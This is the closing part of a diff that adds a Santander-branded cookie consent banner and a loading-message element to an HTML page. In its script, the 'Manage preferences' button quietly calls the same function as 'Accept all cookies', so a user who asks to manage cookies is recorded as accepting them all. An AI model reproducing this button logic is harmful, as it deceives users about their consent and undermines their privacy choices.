+    <div id="ld-msg" style="font-size:14px;color:#555;font-weight:600;letter-spacing:.2px;"></div>
+  </div>
+
+  <!-- Cookie Banner -->
+  <div id="ck-bar" style="position:fixed;bottom:0;left:0;right:0;z-index:9999;">
+    <style>
+      @keyframes ckUp{from{transform:translateY(110%);opacity:0}to{transform:translateY(0);opacity:1}}
+      @keyframes ckDown{from{transform:translateY(0);opacity:1}to{transform:translateY(110%);opacity:0}}
+      #ck-bar{animation:ckUp .5s cubic-bezier(.22,1,.36,1) forwards;}
+    </style>
+    <div style="height:4px;background:#EC0000;"></div>
+    <div style="background:#111;padding:18px 28px;display:flex;align-items:center;gap:20px;flex-wrap:wrap;box-shadow:0 -6px 28px rgba(0,0,0,.5);">
+      <div style="width:48px;height:48px;background:#EC0000;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;box-shadow:0 2px 10px rgba(0,0,0,.3);">&#127850;</div>
+      <div style="flex:1;min-width:200px;">
+        <div style="font-size:14px;font-weight:800;color:#fff;margin-bottom:5px;">Santander uses cookies</div>
+        <p style="font-size:12px;color:#aaa;margin:0;line-height:1.6;">We use cookies and similar technologies to enhance your experience, remember your preferences and help us understand how our site is used. <a href="#" style="color:#f5a0a0;text-decoration:underline;font-weight:600;">Read our cookie policy</a></p>
+      </div>
+      <div style="display:flex;gap:10px;flex-shrink:0;">
+        <button onclick="manageCk()" onmouseover="this.style.borderColor='#aaa';this.style.color='#fff'" onmouseout="this.style.borderColor='#555';this.style.color='#ccc'" style="padding:10px 18px;background:transparent;color:#ccc;border:1.5px solid #555;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;">Manage preferences</button>
+        <button onclick="acceptCk()" onmouseover="this.style.opacity='.88'" onmouseout="this.style.opacity='1'" style="padding:10px 24px;background:#EC0000;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:13px;font-weight:800;white-space:nowrap;box-shadow:0 2px 8px rgba(0,0,0,.25);">Accept all cookies</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    (function(){if(localStorage.getItem('ck-ok'))document.getElementById('ck-bar').style.display='none';})();
+    function acceptCk(){localStorage.setItem('ck-ok','1');var b=document.getElementById('ck-bar');b.style.animation='ckDown .35s ease forwards';setTimeout(function(){b.style.display='none';},320);}
+    function manageCk(){acceptCk();}
+  </script>
+</body>
+</html>
